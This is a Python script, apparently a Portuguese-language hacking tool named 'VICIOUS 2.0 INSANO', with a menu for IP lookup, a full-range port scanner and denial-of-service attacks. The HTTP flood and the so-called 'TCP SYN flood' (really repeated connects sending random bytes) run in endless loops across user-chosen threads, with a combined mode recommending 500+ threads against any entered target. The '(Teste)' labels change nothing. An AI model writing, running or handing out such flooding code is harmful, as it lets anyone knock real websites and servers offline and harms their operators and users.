import socket
import threading
import requests
import random
import time
import sys
import os
from datetime import datetime

try:
    from colorama import Fore, Style, init
    from tqdm import tqdm
    from fake_useragent import UserAgent
except ImportError:
    print("Instalando dependências...")
    os.system('pip install colorama tqdm fake-useragent')
    from colorama import Fore, Style, init
    from tqdm import tqdm
    from fake_useragent import UserAgent

init(autoreset=True)
log_file = open("vicious_log.txt", "a")
ua = UserAgent()

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + Style.BRIGHT + """
 __      ___           _            
 \ \    / (_)         (_)           
  \ \  / / _ _ __ ___  _ _ __   __ _ 
   \ \/ / | | '_ ` _ \| | '_ \ / _` |
    \  /  | | | | | | | | | | | (_| |
     \/   |_|_| |_| |_|_|_| |_|\__, |
                                __/ |
                               |___/ 
""")

def log(text):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_file.write(f"[{now}] {text}\n")
    log_file.flush()

def ip_lookup():
    ip = input("Digite o IP ou dominio para lookup: ")
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json").json()
        for k, v in res.items():
            print(f"{k}: {v}")
            log(f"IP Lookup {ip}: {k} = {v}")
        if 'loc' in res:
            print(Fore.BLUE + f"Mapa: https://www.google.com/maps?q={res['loc']}")
    except Exception as e:
        print("Erro ao fazer lookup:", e)
        log(f"Erro IP Lookup {ip}: {e}")

def port_scanner():
    target = input("Digite o IP do alvo: ")
    start_port = 0
    end_port = 65535
    print("\nIniciando scan de portas completas...\n")
    for port in tqdm(range(start_port, end_port)):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Porta {port} aberta")
                log(f"Porta aberta {target}:{port}")
            sock.close()
        except:
            pass

def http_flood(url, threads):
    def attack():
        while True:
            try:
                headers = {'User-Agent': ua.random}
                requests.get(url, headers=headers)
                print(Fore.CYAN + f"Ataque HTTP enviado para {url}")
                log(f"Ataque HTTP enviado para {url}")
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def tcp_syn_flood(target_ip, target_port, threads):
    def syn_attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(random._urandom(1024))
                print(Fore.MAGENTA + f"Pacote TCP enviado para {target_ip}:{target_port}")
                log(f"Pacote TCP enviado para {target_ip}:{target_port}")
                s.close()
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=syn_attack, daemon=True).start()

def modo_insano():
    target = input("Digite o IP do alvo: ")
    porta = int(input("Digite a porta: "))
    url = input("Digite a URL (http://IP:porta/): ")
    threads = int(input("Quantas threads simultâneas? (recomendo 500+): "))
    print(Fore.RED + "\nINICIANDO MODO INSANO!!!")
    http_flood(url, threads)
    tcp_syn_flood(target, porta, threads)

def menu():
    while True:
        banner()
        for letra in "Bem vindo ao VICIOUS 2.0 INSANO":
            sys.stdout.write(Fore.YELLOW + letra)
            sys.stdout.flush()
            time.sleep(0.05)
        print(Fore.WHITE + """

1 - IP Lookup
2 - Port Scanner Completo
3 - HTTP Flood (Teste)
4 - TCP SYN Flood (Teste)
5 - Modo Insano (HTTP+SYN)
6 - Sair
""")
        escolha = input(Fore.YELLOW + "Escolha uma opção: ")

        if escolha == '1':
            ip_lookup()
        elif escolha == '2':
            port_scanner()
        elif escolha == '3':
            url = input("URL alvo (http://IP:porta/): ")
            threads = int(input("Threads: "))
            http_flood(url, threads)
            input("Pressione ENTER para voltar ao menu...")
        elif escolha == '4':
            ip = input("IP alvo: ")
            port = int(input("Porta: "))
            threads = int(input("Threads: "))
            tcp_syn_flood(ip, port, threads)
            input("Pressione ENTER para voltar ao menu...")
        elif escolha == '5':
            modo_insano()
            input("Pressione ENTER para voltar ao menu...")
        elif escolha == '6':
            print(Fore.GREEN + "Saindo...")
            log("Programa encerrado")
            log_file.close()
            sys.exit()
        else:
            print(Fore.RED + "Opção inválida!")
            time.sleep(1)

if __name__ == "__main__":
    menu()
